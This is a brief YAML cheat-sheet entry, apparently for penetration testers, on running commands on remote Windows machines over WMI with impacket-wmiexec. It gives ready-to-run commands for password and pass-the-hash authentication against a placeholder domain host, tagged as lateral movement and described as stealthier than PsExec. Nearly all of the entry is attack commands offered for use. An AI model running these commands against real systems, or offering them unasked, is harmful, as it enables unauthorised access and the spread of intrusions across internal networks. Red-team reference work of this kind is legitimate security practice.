---
description: |
  Execute commands on remote Windows machines via WMI.
  More stealthy than PsExec — no service creation.

  Reference values:
    Target IP: 10.10.10.1
    Domain: test.local
    Username: admin
    Password: password123
command: |
  # With password
  impacket-wmiexec test.local/admin:password123@10.10.10.1

  # With hash
  impacket-wmiexec test.local/admin@10.10.10.1 -hashes :aad3b435b51404eeaad3b435b51404ee
phase:
  - Lateral_Movement
target_os:
  - Windows
services:
  - WMI
  - DCOM
items:
  - Username
  - Password
  - Hash
techniques:
  - Pass-the-Hash_Ticket
network_position:
  - Internal
references:
  - https://github.com/fortra/impacket
---
